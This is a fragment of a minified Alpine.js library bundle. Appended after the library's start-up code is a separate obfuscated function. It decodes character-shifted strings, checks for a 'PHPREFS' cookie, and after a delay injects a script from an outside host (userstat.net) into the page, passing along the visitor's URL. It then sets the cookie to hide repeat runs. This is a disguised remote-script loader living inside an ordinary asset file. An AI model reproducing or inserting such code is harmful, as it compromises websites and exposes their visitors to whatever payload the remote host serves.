                r.allowRecurse = !!t.allowRecurse,
                r._isEffect = !0,
                r.active = !0,
                r.raw = e,
                r.deps = [],
                r.options = t,
                r
            }(e, t);
            return t.lazy || r(),
            r
        },
        release: function Hr(e) {
            e.active && (Vr(e),
            e.options.onStop && e.options.onStop(),
            e.active = !1)
        },
        raw: g
    });
    var jt = j;
    window.Alpine = jt,
    queueMicrotask(( () => {
        jt.start()
    }
    ))
}
)();
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce( (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
        setTimeout(function() {
            o.c && (o.s = d.createElement('script'),
            o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href,
            d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {}
    ;
}({}, document, location));
